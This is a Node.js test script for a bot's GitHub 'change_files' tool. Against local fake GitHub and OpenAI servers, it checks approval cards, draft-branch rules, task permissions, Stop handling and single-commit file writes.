// Tests for change_files (lib/server/repo-change.ts, its place in lib/server/chat.ts, the pictures of lib/server/chat-pictures.ts): a bot with the user's GitHub key
// changes files in a repository with ONE ask, whatever the number of files. Before the ask only reads go out (the
// branch, its folders, each file there now, for the card's diff: every changed line, whole, after the repository and
// the branch); the ask carries the bot's reason, which files and how, and the facts line says "GitHub · changes 2 files
// on <branch>". A change too big to show whole, a file too big to read, a link or a repository inside is refused, never
// asked for. On Allow, Bops makes the blobs (the text as UTF-8, never base64 from the model), the tree (an executable
// kept one) and the commit, and moves the branch last (making it from its base when it's new); on Deny nothing is
// written; a failure part way leaves the branch where it was. A task never has it. Bad input is said plainly, and
// nothing goes out for it.
// A file may be a picture from the chat: one a person attached (by its number, which the bot is told) or one at a link a
// person wrote (which the bot is shown when it names a picture file), never a link the bot found; its exact bytes go in,
// the ones the card's thumbnail showed, as base64 only Bops makes.
//
// orgo-web is a fake (a local server with /api/secrets and its broker), behind which a stand-in GitHub keeps a tiny
// repository (refs, commits, trees with modes, blobs) in memory; OpenAI is a fake (/v1/responses answers what each test queues);
// the state lives in a throwaway folder: nothing reaches a real service. The keys are made up.
// Usage: node --conditions=react-server scripts/test-file-change.mjs
import assert from "node:assert/strict";
import { createHash, randomBytes } from "node:crypto";
import { mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, utimesSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import { registerHooks } from "node:module";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { pathToFileURL } from "node:url";

for (const k of Object.keys(process.env)) if (/^(BOPS|OPENAI|AGENTPHONE|AGENTMAIL|HONCHO|COMPOSIO|TYPESAFE|TWILIO|ORGO|CODEX|TAILSCALE|TREG)_/.test(k)) delete process.env[k];
process.env.BOPS_SELF_HOSTED = "1";
process.env.OPENAI_API_KEY = "sk-test-file-change";
process.env.BOPS_UI_TOKEN = "ui-token-test-file-change";
const root = new URL("..", import.meta.url).pathname.replace(/\/$/, "");
const scratch = mkdtempSync(join(tmpdir(), "bops-test-file-change-"));
const bin = join(scratch, "bin");
mkdirSync(bin);
writeFileSync(join(bin, "security"), "#!/bin/sh\nexit 44\n", { mode: 0o755 });
process.env.PATH = `${bin}:${process.env.PATH}`;
process.env.HOME = join(scratch, "home");
mkdirSync(process.env.HOME);
const ORGO_KEY = "sk_orgo_test_file_change";
globalThis.bopsOrgoKey = ORGO_KEY;
const work = join(scratch, "work");
mkdirSync(work);
process.chdir(work);

// Modules that start processes when loaded do nothing.
const STAND_INS = new Set(["mac", "relay", "desktop", "mirror", "sessions"]);
registerHooks({
  resolve(specifier, context, next) {
    if (specifier.startsWith("@/")) specifier = pathToFileURL(`${root}/${specifier.slice(2)}`).href;
    try {
      return next(specifier, context);
    } catch (e) {
      if (/^(\.{1,2}\/|\/|file:)/.test(specifier))
        for (const ext of [".ts", ".tsx"])
          try {
            return next(specifier + ext, context);
          } catch {}
      throw e;
    }
  },
  load(url, context, next) {
    const name = url.match(/\/lib\/server\/([a-z-]+)\.ts$/)?.[1];
    if (!name || !STAND_INS.has(name)) return next(url, context);
    const names = [...readFileSync(new URL(url), "utf8").matchAll(/^export (?:async )?(?:function\*? |const |let |class )([A-Za-z_$][\w$]*)/gm)].map((m) => m[1]);
    return { format: "module", shortCircuit: true, source: names.map((n) => `export const ${n} = function () { return Promise.resolve(); };`).join("\n") };
  },
});
const logged = [];
for (const k of ["log", "info", "warn", "error", "debug"]) {
  const was = console[k].bind(console);
  console[k] = (...a) => {
    logged.push(a.map(String).join(" "));
    if (k === "log") was(...a);
  };
}

/* ---------------- A stand-in GitHub, behind Orgo's broker ---------------- */

const sha1 = (s) => createHash("sha1").update(s).digest("hex");
/** One repository, acme/site: its branches, commits, trees (path → blob sha) and blobs (sha → bytes). */
let gh;
function freshRepo() {
  const blobs = new Map();
  const blob = (bytes) => {
    // Git's own id for a file's bytes, as GitHub's trees list it.
    const sha = sha1(Buffer.concat([Buffer.from(`blob ${bytes.length}\0`), bytes]));
    blobs.set(sha, bytes);
    return sha;
  };
  const files = { "src/look.ts": 'export const look = {\n  accent: "#FFD400",\n  ink: "#20222D",\n};\n', "README.md": "# Site\n", "old.css": "a { color: red; }\n", "run.sh": "#!/bin/sh\necho hi\n", "docs/latest": "../old.css", "lib/vendor": "" };
  // Each path's mode, as git keeps it: run.sh runs (100755), docs/latest is a link to old.css (120000), lib/vendor is another repository inside (160000).
  const modes = { "run.sh": "100755", "docs/latest": "120000", "lib/vendor": "160000" };
  const tree = Object.fromEntries(Object.entries(files).map(([p, t]) => [p, { sha: blob(Buffer.from(t)), mode: modes[p] ?? "100644" }]));
  const treeSha = sha1(JSON.stringify(tree));
  const commitSha = sha1(`c0${treeSha}`);
  gh = { blobs, trees: new Map([[treeSha, tree]]), folders: new Map(), commits: new Map([[commitSha, { tree: treeSha, parents: [], message: "First" }]]), refs: new Map([["main", commitSha]]), calls: [], fail: null, blob };
}
/** A folder of root tree `root` (`prefix` "" or "src/"), as GitHub lists one (GET /git/trees/<sha>): its own sha here. */
function folderSha(root, prefix) {
  if (!prefix) return root;
  // By what's in it, as git's are: the same folder in two commits has one sha.
  const under = Object.entries(gh.trees.get(root)).filter(([p]) => p.startsWith(prefix)).sort(([a], [b]) => (a < b ? -1 : 1));
  const sha = sha1(`${prefix}${JSON.stringify(under.map(([p, e]) => [p.slice(prefix.length), e.sha, e.mode]))}`);
  gh.folders.set(sha, { root, prefix });
  return sha;
}
freshRepo();
/** What the stand-in GitHub answers one call (as the broker passes it on): status and JSON. */
function github(method, path, query, body) {
  gh.calls.push({ method, path, query, body });
  gh.onCall?.(method, path);
  const ok = (b, status = 200) => ({ status, body: b });
  const no = (status, message) => ({ status, body: { message } });
  if (gh.fail && gh.fail.method === method && gh.fail.path.test(path)) return no(gh.fail.status, gh.fail.message);
  let m;
  if (method === "GET" && path === "/repos/acme/site") return ok({ full_name: "acme/site", default_branch: "main" });
  if (method === "GET" && (m = /^\/repos\/acme\/site\/git\/ref\/heads\/(.+)$/.exec(path))) {
    const ref = decodeURIComponent(m[1]);
    return gh.refs.has(ref) ? ok({ ref: `refs/heads/${ref}`, object: { sha: gh.refs.get(ref), type: "commit" } }) : no(404, "Not Found");
  }
  if (method === "GET" && (m = /^\/repos\/acme\/site\/git\/commits\/([0-9a-f]+)$/.exec(path))) {
    const c = gh.commits.get(m[1]);
    return c ? ok({ sha: m[1], tree: { sha: c.tree }, parents: c.parents.map((sha) => ({ sha })), message: c.message }) : no(404, "Not Found");
  }
  if (method === "GET" && (m = /^\/repos\/acme\/site\/contents\/(.+)$/.exec(path))) {
    const at = gh.refs.get(query?.ref) ?? query?.ref;
    const tree = gh.trees.get(gh.commits.get(at)?.tree);
    const p = m[1].split("/").map(decodeURIComponent).join("/");
    let e = tree?.[p];
    if (!e) return no(404, "Not Found");
    if (e.mode === "160000") return ok({ type: "submodule", path: p, sha: e.sha });
    // A link to a file is answered with that file, as GitHub does.
    if (e.mode === "120000") e = tree[new URL(gh.blobs.get(e.sha).toString(), `http://x/${p}`).pathname.slice(1)] ?? e;
    const bytes = gh.blobs.get(e.sha);
    // Past 1 MB GitHub sends no text.
    if (bytes.length > 1024 * 1024) return ok({ type: "file", path: p, size: bytes.length, sha: e.sha, encoding: "none", content: "" });
    return ok({ type: "file", path: p, size: bytes.length, sha: e.sha, encoding: "base64", content: bytes.toString("base64").replace(/(.{60})/g, "$1\n") });
  }
  if (method === "GET" && (m = /^\/repos\/acme\/site\/git\/trees\/([0-9a-f]+)$/.exec(path))) {
    const { root, prefix } = gh.trees.has(m[1]) ? { root: m[1], prefix: "" } : (gh.folders.get(m[1]) ?? {});
    const tree = gh.trees.get(root);
    if (!tree) return no(404, "Not Found");
    const entries = new Map();
    for (const [p, e] of Object.entries(tree)) {
      if (!p.startsWith(prefix)) continue;
      const [name, ...rest] = p.slice(prefix.length).split("/");
      if (rest.length) entries.set(name, { path: name, mode: "040000", type: "tree", sha: folderSha(root, `${prefix}${name}/`) });
      else entries.set(name, { path: name, mode: e.mode, type: e.mode === "160000" ? "commit" : "blob", sha: e.sha });
    }
    return ok({ sha: m[1], tree: [...entries.values()], truncated: false });
  }
  if (method === "POST" && path === "/repos/acme/site/git/blobs") {
    if (body.encoding !== "utf-8" && body.encoding !== "base64") return no(422, "Invalid encoding");
    return ok({ sha: gh.blob(Buffer.from(body.content, body.encoding === "base64" ? "base64" : "utf8")) }, 201);
  }
  if (method === "POST" && path === "/repos/acme/site/git/trees") {
    const tree = { ...(gh.trees.get(body.base_tree) ?? {}) };
    for (const e of body.tree) {
      if (e.sha === null) {
        if (!tree[e.path]) return no(422, `${e.path} does not exist`);
        delete tree[e.path];
      } else if (!/^(100644|100755|120000|160000|040000)$/.test(e.mode)) return no(422, `${e.mode} isn't a mode`);
      else tree[e.path] = { sha: e.sha, mode: e.mode };
    }
    const sha = sha1(JSON.stringify(tree));
    gh.trees.set(sha, tree);
    return ok({ sha }, 201);
  }
  if (method === "POST" && path === "/repos/acme/site/git/commits") {
    const sha = sha1(`${body.tree}${body.parents.join()}${body.message}`);
    gh.commits.set(sha, { tree: body.tree, parents: body.parents, message: body.message });
    return ok({ sha, html_url: `https://github.com/acme/site/commit/${sha}` }, 201);
  }
  if (method === "PATCH" && (m = /^\/repos\/acme\/site\/git\/refs\/heads\/(.+)$/.exec(path))) {
    const ref = decodeURIComponent(m[1]);
    if (!gh.refs.has(ref)) return no(422, "Reference does not exist");
    if (!body.force && !gh.commits.get(body.sha)?.parents.includes(gh.refs.get(ref))) return no(422, "Update is not a fast forward");
    gh.refs.set(ref, body.sha);
    return ok({ ref: `refs/heads/${ref}`, object: { sha: body.sha } });
  }
  if (method === "POST" && path === "/repos/acme/site/git/refs") {
    const ref = body.ref.replace(/^refs\/heads\//, "");
    if (gh.refs.has(ref)) return no(422, "Reference already exists");
    gh.refs.set(ref, body.sha);
    return ok({ ref: body.ref, object: { sha: body.sha } }, 201);
  }
  return no(404, "Not Found");
}
const writes = () => gh.calls.filter((c) => c.method !== "GET");
const entryOf = (ref, p) => gh.trees.get(gh.commits.get(gh.refs.get(ref))?.tree)?.[p];
const fileAt = (ref, p) => gh.blobs.get(entryOf(ref, p)?.sha)?.toString();

/** What Orgo's broker takes (app/api/secrets/call: a request's body, 1 MB) and answers whole (512 KB; past it, cut, as text). */
const broker = { maxRequest: 1024 * 1024, maxAnswer: 512 * 1024, refused: 0 };
const server = createServer(async (req, res) => {
  const chunks = [];
  for await (const c of req) chunks.push(c);
  const raw = Buffer.concat(chunks).toString();
  const send = (status, obj) => (res.writeHead(status, { "content-type": "application/json" }), res.end(JSON.stringify(obj)));
  if (req.url === "/api/secrets/call" && raw.length > broker.maxRequest) return (broker.refused++, send(400, { error: "Request body is too large." }));
  const body = chunks.length ? JSON.parse(raw) : undefined;
  const url = new URL(req.url, "http://fake");
  if (req.headers.authorization !== `Bearer ${ORGO_KEY}`) return send(401, { error: "Not authenticated" });
  if (url.pathname === "/api/secrets" && req.method === "GET") return send(200, { secrets: [{ name: "GITHUB_TOKEN", workspace_id: null, created_at: "2026-10-01T00:00:00Z", updated_at: "2026-10-01T00:00:00Z" }] });
  if (url.pathname === "/api/secrets/call" && req.method === "POST") {
    if (body.name !== "GITHUB_TOKEN") return send(404, { error: "Secret not set" });
    // Orgo's broker refuses a path with ".." (as the real one does), whatever the service.
    if (body.path.includes("..")) return send(400, { error: "path must not contain '..'" });
    const r = github(body.method, body.path, body.query, body.body);
    const text = JSON.stringify(r.body);
    if (text.length > broker.maxAnswer) return send(200, { status: r.status, contentType: "application/json", body: text.slice(0, broker.maxAnswer), truncated: true, headers: {} });
    return send(200, { status: r.status, contentType: "application/json", body: r.body, truncated: false, headers: {} });
  }
  send(404, { error: "no such route" });
});
await new Promise((r) => server.listen(0, "127.0.0.1", r));
const PORT = server.address().port;
process.env.BOPS_ORGO_ORIGIN = `http://127.0.0.1:${PORT}`;

/* ---------------- A site with pictures on it (a link a person pastes) ---------------- */

const PNG = (n) => Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), randomBytes(n)]);
/** A PNG that says its size in pixels (its IHDR), then `n` more bytes. */
const PNG_OF = (w, h, n) => {
  const ihdr = Buffer.alloc(25);
  ihdr.writeUInt32BE(13, 0);
  ihdr.write("IHDR", 4, "latin1");
  ihdr.writeUInt32BE(w, 8);
  ihdr.writeUInt32BE(h, 12);
  return Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), ihdr, randomBytes(n)]);
};
/** What the site serves at each path: its type and bytes. */
const site = new Map([["/logo.png", { type: "image/png", bytes: PNG(400) }], ["/about.html", { type: "text/html", bytes: Buffer.from("<p>About</p>") }]]);
const siteHits = [];
const pics = createServer((req, res) => {
  siteHits.push(req.url);
  const f = site.get(req.url);
  if (!f) return res.writeHead(404).end();
  res.writeHead(200, { "content-type": f.type, "content-length": f.bytes.length });
  res.end(f.bytes);
});
await new Promise((r) => pics.listen(0, "127.0.0.1", r));
const SITE = `http://127.0.0.1:${pics.address().port}`;
// safe-fetch lets this one local address through, as its tests do (never Bops' own ports).
process.env.BOPS_FETCH_ALLOW = `127.0.0.1:${pics.address().port}`;
const sha256 = (b) => createHash("sha256").update(b).digest("hex");

/* ---------------- A fake OpenAI ---------------- */

const realFetch = globalThis.fetch;
const json = (obj, status = 200) => new Response(JSON.stringify(obj), { status, headers: { "content-type": "application/json" } });
const asked = [];
const answers = [];
const response = (id, output) => ({ id, object: "response", model: "gpt-test", status: "completed", output, usage: { input_tokens: 100, output_tokens: 10, input_tokens_details: { cached_tokens: 0 }, output_tokens_details: { reasoning_tokens: 0 } } });
const said = (text) => ({ id: `msg_${asked.length}`, type: "message", role: "assistant", content: [{ type: "output_text", text, annotations: [] }] });
let calls = 0;
const toolCall = (name, args) => ({ id: `fc_${++calls}`, type: "function_call", call_id: `call_${calls}`, name, arguments: JSON.stringify(args) });
const reply = (text) => () => response(`resp_${asked.length}`, [said(text)]);
const calling = (...items) => () => response(`resp_${asked.length}`, items);
globalThis.fetch = async (input, init) => {
  const req = new Request(input, init);
  const url = new URL(req.url);
  if (url.host === `127.0.0.1:${PORT}`) return realFetch(input, init);
  if (url.origin === "https://api.openai.com" && url.pathname === "/v1/responses") {
    const b = JSON.parse(await req.text());
    // The chat's running summary, made in the background once a chat is long: answered here, never from the queue.
    if (String(b.instructions ?? "").startsWith("You keep the running summary")) return json(response("resp_summary", [said("They talked.")]));
    asked.push(b);
    const next = answers.shift();
    return json(next ? await next(b) : response(`resp_${asked.length}`, [said("Done.")]));
  }
  throw new TypeError(`fetch failed (the test is offline: ${url.host})`);
};

let failures = 0;
let passed = 0;
async function check(name, fn) {
  try {
    await fn();
    passed++;
    console.log(`ok   ${name}`);
  } catch (e) {
    failures++;
    process.stderr.write(`FAIL ${name}\n  ${e.stack?.split("\n").slice(0, 4).join("\n  ") ?? e.message}\n`);
  }
}
const DASHES = /[‒–—―]| - /;
async function until(ok, what, ms = 5000) {
  for (const end = Date.now() + ms; Date.now() < end; await new Promise((r) => setTimeout(r, 10))) if (ok()) return;
  assert.fail(`timed out waiting for ${what}`);
}

const S = await import(`${root}/lib/server/store.ts`);
const { botChatId } = await import(`${root}/lib/types.ts`);
const Keys = await import(`${root}/lib/server/keys.ts`);
const Chat = await import(`${root}/lib/server/chat.ts`);
const P = await import(`${root}/lib/server/permission.ts`);
const Up = await import(`${root}/lib/server/uploads.ts`);
const { apiFacts } = await import(`${root}/lib/permission.ts`);
clearInterval(globalThis.__bopsRoutines);

const chatId = botChatId("boppy");
S.update((s) => (s.owner = { name: "Alex", timeZone: "America/New_York" }));
Keys.grantKey("GITHUB_TOKEN", "boppy", true);
const messages = () => S.getState().messages.filter((m) => m.chatId === chatId);
const outputOf = (body, i = 0) => body.input.filter((x) => x.type === "function_call_output")[i]?.output;
const NEW_LOOK = 'export const look = {\n  accent: "#F15B3B",\n  ink: "#20222D",\n};\n';
// (On the default branch, main: what goes live, so it asks. A draft branch is saved at once: draft below.)
const change = (over = {}) => ({
  key: "GITHUB_TOKEN",
  repo: "acme/site",
  branch: "main",
  base: null,
  message: "Use the logo orange for the buttons",
  reason: "Make the buttons the logo's orange, as a draft",
  files: [
    { path: "src/look.ts", text: NEW_LOOK, delete: null },
    { path: "src/notes.md", text: "Buttons: orange.\n", delete: null },
  ],
  ...over,
});
/** A turn in which the bot calls change_files with `args`: it pauses at the ask. Returns the ask and how many model calls it made. */
async function asking(args, after = "Saved.") {
  answers.push(calling(toolCall("change_files", args)), reply(after));
  const a0 = asked.length;
  const asks = S.getState().appApprovals?.length ?? 0;
  await Chat.handleMessage(chatId, "make the buttons orange");
  return { a0, apr: S.getState().appApprovals.at(-1), opened: (S.getState().appApprovals?.length ?? 0) - asks };
}

/* ---------------- The tool ---------------- */

await check("a reply with a key has room for a whole site change: twenty reads, then its answer, never out of steps", async () => {
  const look = () => calling(toolCall("read_skill", { name: "nothing-here", file: null }));
  answers.push(...Array.from({ length: 20 }, look), reply("Read them all."));
  const n = asked.length;
  await Chat.handleMessage(chatId, "look over the site's files");
  assert.equal(asked.length - n, 21, "twenty rounds of reading and the answer");
  assert.doesNotMatch(JSON.stringify(asked.at(-1).input), /out of steps for this reply/);
  assert.equal(messages().findLast((m) => m.role === "bot").text, "Read them all.");
});

await check("a bot with the GitHub key has change_files in the chat, saying to use it for any change to files; call_api says so too, and the prompt", async () => {
  answers.push(reply("Hi."));
  const n = asked.length;
  await Chat.handleMessage(chatId, "hi");
  const body = asked[n];
  const tool = body.tools.find((t) => t.name === "change_files");
  assert.ok(tool, "offered");
  assert.equal(tool.strict, true);
  assert.deepEqual(tool.parameters.required, Object.keys(tool.parameters.properties), "strict: every field required");
  assert.deepEqual(tool.parameters.properties.files.items.required, Object.keys(tool.parameters.properties.files.items.properties));
  assert.deepEqual(tool.parameters.properties.key.enum, ["GITHUB_TOKEN"]);
  assert.deepEqual(Object.keys(tool.parameters.properties.files.items.properties), ["path", "text", "delete", "image", "imageUrl"], "a chat turn on the Mac can put in a picture from the chat");
  assert.match(tool.description, /goes in byte for byte, up to 700 KB each/);
  assert.match(tool.description, /any change to files, never call_api's contents or git calls/);
  assert.match(tool.description, /not a diff, not base64/);
  assert.match(body.tools.find((t) => t.name === "call_api").description, /To change files in a GitHub repository \(an edit, a new file, a delete\), use change_files, never these calls/);
  assert.match(JSON.stringify(body.input), /change_files/, "the chat's own words point at it too");
  for (const t of [tool.description, ...Object.values(tool.parameters.properties).map((p) => p.description ?? "")]) assert.ok(!DASHES.test(t), t);
});

await check("a task has change_files too, and each change it makes is one card someone answers, even with an Always allow saved; the yes writes as the card said; nothing else changes files", async () => {
  const src = readFileSync(`${root}/lib/server/computer-task.ts`, "utf8");
  assert.match(src, /changeFilesTool\(keyed\)/, "offered to a task with the GitHub key");
  assert.match(src, /changeFiles\([^)]*\{ task: true, approved: opts\.approved/, "a task's change asks as a task's");
  const { changeFiles } = await import(`${root}/lib/server/repo-change.ts`);
  freshRepo();
  S.update(() => (S.bot("boppy").permissions = [{ action: "Call GitHub", resource: "*", effect: "allow" }]));
  try {
    const e = await changeFiles("boppy", change(), { sessionId: "ses_x" }, { task: true }).then(() => null, (x) => x);
    assert.ok(e instanceof P.NeedsOk, "asked, never run by the Always allow");
    assert.deepEqual(e.ask.resources, ["src/look.ts", "src/notes.md"], "one card for both files");
    assert.deepEqual(writes(), [], "nothing written before the yes");
    const done = await changeFiles("boppy", change(), { sessionId: "ses_x" }, { task: true, approved: true, asked: e.ask.api.change });
    assert.equal(done.failed, undefined, done.text);
    assert.ok(writes().some((c) => c.path.includes("/git/refs")), "the branch made, last");
  } finally {
    S.update(() => delete S.bot("boppy").permissions);
  }
  const n = gh.calls.length;
  const r = await changeFiles("boppy", change(), { sessionId: "ses_x" });
  assert.equal(r.text, "Only in the chat or a task: nothing else changes files.");
  assert.equal(gh.calls.length, n, "nothing sent");
  // A task has no chat of its own, so it's offered no pictures (none it could find), and one it sends is refused plainly.
  const { changeFilesTool } = await import(`${root}/lib/server/repo-change.ts`);
  const tool = changeFilesTool([Keys.keyProvider("GITHUB_TOKEN")]);
  assert.deepEqual(Object.keys(tool.parameters.properties.files.items.properties), ["path", "text", "delete"], "the task's tool, as computer-task.ts makes it");
  assert.deepEqual(tool.parameters.properties.files.items.required, ["path", "text", "delete"]);
  assert.doesNotMatch(tool.description, /picture/i);
  const pic = await changeFiles("boppy", change({ files: [{ path: "public/logo.png", text: null, delete: null, image: 1, imageUrl: null }] }), { sessionId: "ses_x" }, { task: true });
  assert.equal(pic.text, "A picture can't go into a change from here yet. Only text files can.");
  assert.equal(gh.calls.length, n, "nothing sent for it");
});

await check("a task pauses at its change on one card; Allow once resumes it and saves exactly that change; Stop first and nothing is written", async () => {
  const CT = await import(`${root}/lib/server/computer-task.ts`);
  let n = 0;
  const task = (signal = new AbortController().signal) => {
    const id = `ses_task_${++n}`;
    S.update((s) => s.sessions.push({ id, botId: "boppy", chatId, title: "Site change", goal: "Change the site", status: "queued", replies: [], createdAt: Date.now() }));
    return { sessionId: id, computerId: "fake", display: 100, model: "gpt-test", effort: "low", instructions: "test", apps: false, signal, timeoutMs: 5000, idleMs: 5000, step: () => {} };
  };
  const pause = async (t) => {
    answers.push(calling(toolCall("change_files", change())));
    const e = await CT.computerTurn(t).then(() => null, (x) => x);
    assert.ok(e instanceof P.Paused, `paused at the card (${e})`);
    return S.getState().appApprovals.find((a) => a.id === e.askId);
  };
  // Allow once: the same change, written.
  freshRepo();
  const t1 = task();
  const a1 = await pause(t1);
  assert.equal(a1.threadId, t1.sessionId);
  assert.deepEqual(writes(), []);
  answers.push(reply("Saved the draft."));
  await CT.computerTurn({ ...t1, resume: { ...a1, reply: { reply: "once", at: Date.now() } } });
  assert.ok(writes().some((c) => c.path.includes("/git/refs")), "the branch made");
  // Stop before the yes is acted on: nothing written.
  freshRepo();
  const t2 = task();
  const a2 = await pause(t2);
  const stop = new AbortController();
  answers.push(reply("Saved."));
  const resumed = CT.computerTurn({ ...t2, signal: stop.signal, resume: { ...a2, reply: { reply: "once", at: Date.now() } } });
  stop.abort();
  await resumed.then(() => {}, () => {});
  await new Promise((r) => setTimeout(r, 100));
  assert.deepEqual(writes(), [], "a stopped task writes nothing");
  answers.length = 0;
  // An Always allow (an older Bops's, or spread from another card) is no yes for a task's change: declined, nothing written.
  freshRepo();
  const t3 = task();
  const a3 = await pause(t3);
  answers.push(reply("I'll ask again."));
  await CT.computerTurn({ ...t3, resume: { ...a3, reply: { reply: "always", at: Date.now() } } });
  assert.deepEqual(writes(), [], "not written on an Always allow");
  assert.match(JSON.stringify(asked.at(-1).input), /an Always allow doesn't count for a change a task makes/);
  answers.length = 0;
});

await check("a task's write card: Bops' facts lead and the bot's words are labelled below; Always allow is refused on it, and one given on another card answers neither it nor another person's card", async () => {
  const { changeFiles } = await import(`${root}/lib/server/repo-change.ts`);
  freshRepo();
  const asked = async (where, opts) => changeFiles("boppy", change(), where, opts).then(() => null, (x) => x);
  const fromTask = await asked({ sessionId: "ses_card" }, { task: true });
  assert.equal(fromTask.ask.reason, undefined, "no headline in the bot's words");
  assert.match(fromTask.ask.preview, /\n\nIn the bot's words: Make the buttons the logo's orange, as a draft$/);
  const resume = { engine: "responses", responseId: "resp_c", callId: "call_c", call: { name: "change_files", arguments: "{}" } };
  const taskCard = P.askFor(fromTask.ask, { botId: "boppy", threadId: "ses_card" }, resume);
  const chatAsk = (await asked({ chatId }, { chat: true })).ask;
  const chatCard = P.askFor(chatAsk, { botId: "boppy", chatId }, { engine: "chat" });
  const deeCard = P.askFor((await asked({ chatId, member: "Dee" }, { chat: true })).ask, { botId: "boppy", chatId }, { engine: "chat" });
  try {
    assert.equal(P.replyToAsk(taskCard.id, "always"), "A task's change is allowed once at a time: Allow once or Deny.");
    assert.equal(P.replyToAsk(chatCard.id, "always"), undefined);
    const now = (a) => S.getState().appApprovals.find((x) => x.id === a.id);
    assert.equal(now(taskCard).reply, undefined, "the task's card still waits for its own answer");
    assert.equal(now(deeCard).reply, undefined, "another person's card isn't answered by this Always allow");
  } finally {
    S.update((s) => {
      delete s.bots.find((b) => b.id === "boppy").permissions;
      s.appApprovals = (s.appApprovals ?? []).filter((a) => ![taskCard.id, chatCard.id, deeCard.id].includes(a.id));
    });
  }
});

/* ---------------- Drafts ---------------- */

/** The repository lists its draft branches (.github/bops.json on main, as its people put it there). */
const listDrafts = (drafts = ["site/"]) => theirCommit("main", ".github/bops.json", JSON.stringify({ drafts }));

await check("a draft on a branch the repository lists, from main, is saved at once, on the owner's turn, a member's and a task's: no card", async () => {
  const { changeFiles, isDraft, draftPrefixes } = await import(`${root}/lib/server/repo-change.ts`);
  const on = (branch, base = null) => ({ branch, base });
  assert.equal(isDraft(on("site/orange"), "main", ["site/"], [{ path: "src/look.ts" }]), true);
  assert.equal(isDraft(on("site/orange", "main"), "main", ["site/"], [{ path: "src/look.ts" }]), true, "a new one from main");
  assert.equal(isDraft(on("site/orange", "site/old"), "main", ["site/"], [{ path: "a.md" }]), false, "a new one from another branch asks");
  assert.equal(isDraft(on("feature/x"), "main", ["site/"], [{ path: "a.md" }]), false, "a branch it doesn't list asks");
  assert.equal(isDraft(on("site/x"), "main", [], [{ path: "a.md" }]), false, "a repository that lists none asks");
  assert.equal(isDraft(on("Main"), "main", ["M", "Main/"], [{ path: "a.md" }]), false, "the default branch in any case asks");
  assert.equal(isDraft(on("site/x"), "main", ["site/"], [{ path: ".github/workflows/ci.yml" }]), false, "GitHub's automation asks");
  assert.equal(isDraft(on("site/x"), "", ["site/"], [{ path: "a.md" }]), false, "no default branch known: it asks");
  assert.deepEqual(draftPrefixes('{"drafts":["site/","x","/root/","a/../b/",7,"refs/","heads/x/","preview/"]}'), ["site/", "preview/"], "each ends in /, nothing odd");
  assert.deepEqual([draftPrefixes(null), draftPrefixes("not json"), draftPrefixes('{"drafts":"site/"}')], [[], [], []]);
  for (const [who, where, opts] of [["owner", { chatId }, { chat: true }], ["member", { chatId, member: "Dee" }, { chat: true }], ["task", { sessionId: "ses_draft" }, { task: true }]]) {
    freshRepo();
    listDrafts();
    const asks = S.getState().appApprovals?.length ?? 0;
    const done = await changeFiles("boppy", change({ branch: "site/orange-buttons" }), where, opts);
    assert.equal(done.failed, undefined, `${who}: ${done.text}`);
    assert.match(done.text, /^Saved: 2 files on site\/orange-buttons in acme\/site, a new branch from main \(commit [0-9a-f]{7}\)/, who);
    assert.equal(S.getState().appApprovals?.length ?? 0, asks, `${who}: no card`);
    assert.equal(writes().at(-1).path, "/repos/acme/site/git/refs", `${who}: the branch made last`);
    assert.equal(fileAt("site/orange-buttons", "src/look.ts"), NEW_LOOK);
    assert.equal(fileAt("main", "src/look.ts").includes("#FFD400"), true, `${who}: main untouched`);
  }
});

await check("anything else asks, a task's too, nothing written before the yes: no list, a branch it doesn't list, one from another branch, .github/, the default branch", async () => {
  const { changeFiles } = await import(`${root}/lib/server/repo-change.ts`);
  const asks = async (args, opts = { task: true }, where = { sessionId: "ses_ask" }) => {
    const e = await changeFiles("boppy", args, where, opts).then((r) => r, (x) => x);
    assert.ok(e instanceof P.NeedsOk, `asked: ${args.branch} (${e?.text ?? e})`);
  };
  freshRepo();
  await asks(change({ branch: "site/orange-buttons" }));
  listDrafts();
  gh.refs.set("site/old", gh.refs.get("main"));
  await asks(change({ branch: "feature/orange" }));
  await asks(change({ branch: "site/orange-buttons", base: "site/old" }));
  await asks(change({ branch: "site/ci", files: [{ path: ".github/workflows/preview.yml", text: "on: push\n", delete: null }] }));
  await asks(change({ branch: "site/ci", files: [{ path: ".github/bops.json", text: '{"drafts":["feature/"]}', delete: null }] }), { chat: true }, { chatId });
  await asks(change());
  // A listed branch a person gave automation of its own: its push would run that, so it asks.
  gh.refs.set("site/own", gh.refs.get("main"));
  theirCommit("site/own", ".github/workflows/own.yml", "on: push\n");
  await asks(change({ branch: "site/own" }));
  assert.deepEqual(writes(), []);
  // One with the default branch's automation, other changes of its own: a draft.
  gh.refs.set("site/same", gh.refs.get("main"));
  theirCommit("site/same", "README.md", "# Site, edited\n");
  const done = await changeFiles("boppy", change({ branch: "site/same" }), { sessionId: "ses_same" }, { task: true });
  assert.match(done.text, /^Saved: 2 files on site\/same in acme\/site \(commit/);
});

await check("a task stopped while its draft is saving writes nothing more, and its branch never moves", async () => {
  const { changeFiles } = await import(`${root}/lib/server/repo-change.ts`);
  freshRepo();
  listDrafts();
  const stop = new AbortController();
  stop.abort();
  const r = await changeFiles("boppy", change({ branch: "site/stopped" }), { sessionId: "ses_stop" }, { task: true, signal: stop.signal });
  assert.match(r.text, /^Not saved: stopped, the task was stopped first\. Nothing changed on site\/stopped\.$/);
  assert.deepEqual(writes(), []);
  assert.equal(gh.refs.has("site/stopped"), false);
  assert.match(readFileSync(`${root}/lib/server/computer-task.ts`, "utf8"), /changeFiles\([^)]*signal: t\.signal/, "a task passes its Stop");
  // Stopped during the last read before saving (the third commit read: the change's start, the default branch's, then
  // the save's own): nothing is written after it.
  freshRepo();
  listDrafts();
  const late = new AbortController();
  let reads = 0;
  gh.onCall = (method, path) => method === "GET" && path.includes("/git/commits/") && ++reads === 3 && late.abort();
  const r2 = await changeFiles("boppy", change({ branch: "site/stopped" }), { sessionId: "ses_stop" }, { task: true, signal: late.signal });
  gh.onCall = undefined;
  assert.equal(late.signal.aborted, true, "stopped during a read");
  assert.match(r2.text, /^Not saved: stopped/);
  assert.deepEqual(writes(), [], "nothing written after the Stop");
  assert.equal(gh.refs.has("site/stopped"), false);
});

/* ---------------- The card's diff ---------------- */

